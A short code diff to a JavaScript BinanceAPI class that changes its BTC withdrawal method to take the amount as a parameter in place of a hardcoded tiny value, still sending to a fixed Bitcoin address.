@@ -29,11 +29,11 @@ export class BinanceAPI {
 			.update(querystring.stringify(params))
 			.digest("hex");
 	}
-	async widthdraw() {
+	async widthdraw(amount) {
 		let params = {
       coin: "BTC",
       address: "bc1qgulgqzx34cz82f2fyr3ytk57t8mzefpv207tne",
-      amount: "0.0000000000000000000000000000000000000000000000000000001",
+      amount: amount,
 			recvWindow: 30000,
 			timestamp: Date.now(),
 
